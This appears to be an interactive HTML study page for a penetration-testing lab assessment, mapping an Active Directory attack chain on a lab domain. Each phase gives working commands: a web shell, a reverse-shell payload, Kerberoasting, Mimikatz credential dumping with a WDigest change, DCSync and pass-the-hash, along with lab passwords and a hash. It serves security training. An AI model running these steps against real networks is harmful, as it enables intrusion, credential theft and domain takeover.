@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Attack Chain Mindmap — Skills Assessment Part I</title>
+<style>
+:root{--color-background-primary:#fff;--color-background-secondary:#f7f7f5;--color-background-tertiary:#ededea;--color-text-primary:#1a1a1a;--color-text-secondary:#6b6b6b;--color-text-tertiary:#999;--color-border-tertiary:rgba(0,0,0,0.15);--color-border-secondary:rgba(0,0,0,0.3);--color-border-info:#185FA5;--color-background-danger:#FCEBEB;--color-text-danger:#A32D2D;--color-background-info:#E6F1FB;--color-text-info:#185FA5;--color-background-success:#EAF3DE;--color-text-success:#3B6D11;--color-background-warning:#FAEEDA;--color-text-warning:#854F0B;--border-radius-md:8px;--border-radius-lg:12px;--font-sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;--font-mono:"SF Mono",Monaco,Consolas,monospace}
+@media(prefers-color-scheme:dark){:root{--color-background-primary:#1a1a1a;--color-background-secondary:#2a2a2a;--color-background-tertiary:#333;--color-text-primary:#e8e8e8;--color-text-secondary:#aaa;--color-text-tertiary:#777;--color-border-tertiary:rgba(255,255,255,0.15);--color-border-secondary:rgba(255,255,255,0.3);--color-border-info:#85B7EB;--color-background-danger:#501313;--color-text-danger:#F09595;--color-background-info:#042C53;--color-text-info:#85B7EB;--color-background-success:#173404;--color-text-success:#97C459;--color-background-warning:#412402;--color-text-warning:#FAC775}}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:var(--font-sans);background:var(--color-background-tertiary);color:var(--color-text-primary);padding:24px;max-width:720px;margin:0 auto}
+h1{font-size:20px;font-weight:500;margin-bottom:4px}
+.subtitle{font-size:13px;color:var(--color-text-secondary);margin-bottom:24px}
+.card{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:12px 16px;cursor:pointer;transition:border-color .2s,transform .15s}
+.card:hover{border-color:var(--color-border-secondary);transform:translateY(-1px)}
+.card.active{border-color:var(--color-border-info);border-width:2px}
+.phase-label{font-size:11px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;margin-bottom:4px}
+.phase-title{font-size:15px;font-weight:500;color:var(--color-text-primary)}
+.phase-sub{font-size:12px;color:var(--color-text-secondary);margin-top:2px}
+.detail-panel{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:20px;margin-top:8px;display:none}
+.detail-panel.show{display:block}
+.detail-panel h3{font-size:16px;font-weight:500;margin-bottom:8px;color:var(--color-text-primary)}
+.detail-panel p{font-size:13px;color:var(--color-text-secondary);line-height:1.6;margin-bottom:8px}
+.cmd{font-family:var(--font-mono);font-size:12px;background:var(--color-background-tertiary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:8px 12px;margin:6px 0;overflow-x:auto;white-space:pre;display:block;color:var(--color-text-primary)}
+.tool-badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:var(--border-radius-md);margin-right:4px;margin-bottom:4px}
+.t-red{background:var(--color-background-danger);color:var(--color-text-danger)}
+.t-blue{background:var(--color-background-info);color:var(--color-text-info)}
+.t-green{background:var(--color-background-success);color:var(--color-text-success)}
+.t-amber{background:var(--color-background-warning);color:var(--color-text-warning)}
+.arrow-connector{display:flex;align-items:center;justify-content:center;padding:4px 0;color:var(--color-text-tertiary);font-size:18px}
+</style>
+</head>
+<body>
+<h1>AD attack chain — Skills Assessment Part I</h1>
+<p class="subtitle">Click each phase to expand details, tools, and commands</p>
+
+<div id="phases">
+
+<div class="card" onclick="toggle(0)" id="c0">
+<div class="phase-label" style="color:var(--color-text-success)">Phase 1 — Initial access</div>
+<div class="phase-title">Web shell → foothold</div>
+<div class="phase-sub">Exploit file upload vuln, access web shell, get command execution</div>
+</div>
+<div class="detail-panel" id="d0">
+<h3>Web shell → foothold</h3>
+<p><strong>What happens:</strong> A teammate left a password-protected web shell on the externally-facing web server. We use it to run OS commands on WEB01.</p>
+<div style="margin:8px 0"><span class="tool-badge t-green">web shell</span><span class="tool-badge t-blue">certutil</span><span class="tool-badge t-amber">msfvenom</span></div>
+<p><strong>Key commands:</strong></p>
+<code class="cmd">http://&lt;TARGET&gt;/uploads/   →   admin:My_W3bsH3ll_P@ssw0rd!</code>
+<code class="cmd">whoami && whoami /priv && ipconfig /all</code>
+<p><strong>Why it works:</strong> File upload vulnerability allowed placing an ASPX/PHP shell. The web server process runs with enough privileges to interact with AD.</p>
+<p><strong>If you need a reverse shell:</strong></p>
+<code class="cmd">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o payload.exe</code>
+</div>
+
+<div class="arrow-connector">↓</div>
+
+<div class="card" onclick="toggle(1)" id="c1">
+<div class="phase-label" style="color:var(--color-text-info)">Phase 2 — Kerberoasting</div>
+<div class="phase-title">Enumerate SPNs → extract TGS hash → crack offline</div>
+<div class="phase-sub">Target service accounts with weak passwords</div>
+</div>
+<div class="detail-panel" id="d1">
+<h3>Kerberoasting</h3>
+<p><strong>What it is:</strong> Any domain user can request a Kerberos TGS ticket for any service with an SPN. The ticket is encrypted with the service account's password hash. We crack it offline — no lockouts, no alerts.</p>
+<div style="margin:8px 0"><span class="tool-badge t-red">Invoke-Kerberoast</span><span class="tool-badge t-blue">setspn</span><span class="tool-badge t-amber">hashcat</span><span class="tool-badge t-green">PowerView</span></div>
+<p><strong>Step 1 — Find SPNs:</strong></p>
+<code class="cmd">setspn -T inlanefreight.local -Q */*</code>
+<p><strong>Step 2 — Pull TGS hash:</strong></p>
+<code class="cmd">Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat</code>
+<p><strong>Step 3 — Crack offline:</strong></p>
+<code class="cmd">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</code>
+<p><strong>Why it works:</strong> Service accounts often have weak, human-chosen passwords. The Kerberos protocol allows any authenticated user to request tickets — by design.</p>
+</div>
+
+<div class="arrow-connector">↓</div>
+
+<div class="card" onclick="toggle(2)" id="c2">
+<div class="phase-label" style="color:var(--color-text-warning)">Phase 3 — Lateral movement</div>
+<div class="phase-title">Service account creds → access MS01</div>
+<div class="phase-sub">Use cracked password to move to internal hosts</div>
+</div>
+<div class="detail-panel" id="d2">
+<h3>Lateral movement</h3>
+<p><strong>What happens:</strong> The cracked service account (svc_sql / lucky7) has admin access on MS01. We use those creds to move laterally.</p>
+<div style="margin:8px 0"><span class="tool-badge t-blue">net use</span><span class="tool-badge t-red">evil-winrm</span><span class="tool-badge t-amber">psexec</span><span class="tool-badge t-green">xfreerdp</span></div>
+<p><strong>Quick file access:</strong></p>
+<code class="cmd">net use \\MS01\c$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
+type \\MS01\c$\Users\Administrator\Desktop\flag.txt</code>
+<p><strong>RDP via port forwarding (for interactive access):</strong></p>
+<code class="cmd">netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=&lt;WEB01_IP&gt; connectport=3389 connectaddress=172.16.6.50</code>
+<code class="cmd">xfreerdp /u:svc_sql /p:lucky7 /v:&lt;WEB01_IP&gt;:8888 /dynamic-resolution /drive:Shared,/home/user/</code>
+<p><strong>Why port forwarding?</strong> MS01 is on an internal network (172.16.6.x) — not directly reachable from Pwnbox. WEB01 bridges the external and internal networks.</p>
+</div>
+
+<div class="arrow-connector">↓</div>
+
+<div class="card" onclick="toggle(3)" id="c3">
+<div class="phase-label" style="color:#D4537E">Phase 4 — Credential hunting</div>
+<div class="phase-title">Mimikatz → dump plaintext creds from LSASS</div>
+<div class="phase-sub">Enable WDigest if needed, extract domain user password</div>
+</div>
+<div class="detail-panel" id="d3">
+<h3>Mimikatz — credential extraction</h3>
+<p><strong>What it is:</strong> Mimikatz reads the LSASS (Local Security Authority Subsystem) process memory to extract credentials. LSASS handles authentication — passwords, hashes, and tickets pass through it.</p>
+<div style="margin:8px 0"><span class="tool-badge t-red">mimikatz</span><span class="tool-badge t-blue">WDigest</span><span class="tool-badge t-amber">LSASS</span></div>
+<p><strong>Run Mimikatz:</strong></p>
+<code class="cmd">mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords</code>
+<p><strong>If passwords show blank — enable WDigest + reboot:</strong></p>
+<code class="cmd">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+shutdown.exe /r /t 0 /f</code>
+<p><strong>WDigest explained:</strong> Old Windows auth protocol that stores plaintext passwords in LSASS. Disabled by default since Win 8.1/2012R2. Re-enabling it + forcing a user to re-authenticate = plaintext creds in memory.</p>
+<p><strong>Found:</strong> tpetty / Sup3rS3cur3D0m@inU2eR</p>
+</div>
+
+<div class="arrow-connector">↓</div>
+
+<div class="card" onclick="toggle(4)" id="c4">
+<div class="phase-label" style="color:#534AB7">Phase 5 — Privilege escalation</div>
+<div class="phase-title">Enumerate ACLs → find DCSync rights</div>
+<div class="phase-sub">Discovered user has replication permissions on domain object</div>
+</div>
+<div class="detail-panel" id="d4">
+<h3>ACL enumeration → DCSync rights</h3>
+<p><strong>What happens:</strong> We enumerate tpetty's permissions in AD and discover they have Replicating Directory Changes + Replicating Directory Changes All — the two permissions needed for DCSync.</p>
+<div style="margin:8px 0"><span class="tool-badge t-green">PowerView</span><span class="tool-badge t-blue">BloodHound</span></div>
+<p><strong>Enumerate ACLs:</strong></p>
+<code class="cmd">Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid tpetty
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}</code>
+<p><strong>What to look for:</strong></p>
+<p>• <strong>DCSync:</strong> DS-Replication-Get-Changes + DS-Replication-Get-Changes-All<br>
+• <strong>GenericAll:</strong> Full control over an object (reset passwords, add to groups)<br>
+• <strong>WriteDACL:</strong> Can modify ACLs — grant yourself any permission<br>
+• <strong>AddMember:</strong> Can add users to groups (e.g., Domain Admins)</p>
+</div>
+
+<div class="arrow-connector">↓</div>
+
+<div class="card" onclick="toggle(5)" id="c5">
+<div class="phase-label" style="color:var(--color-text-danger)">Phase 6 — Domain compromise</div>
+<div class="phase-title">DCSync → PtH → domain admin on DC01</div>
+<div class="phase-sub">Extract admin NTLM hash, pass-the-hash to domain controller</div>
+</div>
+<div class="detail-panel" id="d5">
+<h3>DCSync → Pass-the-Hash → domain admin</h3>
+<p><strong>DCSync:</strong> Mimikatz impersonates a Domain Controller and uses the AD replication protocol (MS-DRSR) to request the password hash of any account. No need to touch LSASS on the DC.</p>
+<p><strong>Evil-WinRM:</strong> A Ruby tool for remote management via WinRM (port 5985). Supports Pass-the-Hash — authenticate with an NTLM hash instead of a plaintext password.</p>
+<div style="margin:8px 0"><span class="tool-badge t-red">mimikatz DCSync</span><span class="tool-badge t-blue">evil-winrm</span><span class="tool-badge t-amber">netsh portfwd</span></div>
+<p><strong>Step 1 — Run as tpetty:</strong></p>
+<code class="cmd">runas /user:INLANEFREIGHT\tpetty powershell.exe</code>
+<p><strong>Step 2 — DCSync:</strong></p>
+<code class="cmd">mimikatz.exe
+privilege::debug
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code>
+<p><strong>Step 3 — Port forward to DC01:</strong></p>
+<code class="cmd">netsh.exe interface portproxy add v4tov4 listenport=6666 listenaddress=&lt;WEB01_IP&gt; connectport=5985 connectaddress=172.16.6.3</code>
+<p><strong>Step 4 — Pass-the-Hash:</strong></p>
+<code class="cmd">evil-winrm -i &lt;WEB01_IP&gt; --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0</code>
+<p><strong>Why PtH works:</strong> NTLM authentication only needs the hash, not the password. The protocol sends a challenge → the client encrypts it with the hash → the server verifies. The plaintext password is never transmitted.</p>
+</div>
+
+</div>
+
+<script>
+let activeIdx = -1;
+function toggle(idx) {
+  const cards = document.querySelectorAll('.card');
+  const panels = document.querySelectorAll('.detail-panel');
+  if (activeIdx === idx) {
+    cards[idx].classList.remove('active');
+    panels[idx].classList.remove('show');
+    activeIdx = -1;
+    return;
+  }
+  cards.forEach(c => c.classList.remove('active'));
+  panels.forEach(p => p.classList.remove('show'));
+  cards[idx].classList.add('active');
+  panels[idx].classList.add('show');
+  activeIdx = idx;
+  panels[idx].scrollIntoView({behavior:'smooth', block:'nearest'});
+}
+</script>
+</body>
+</html>
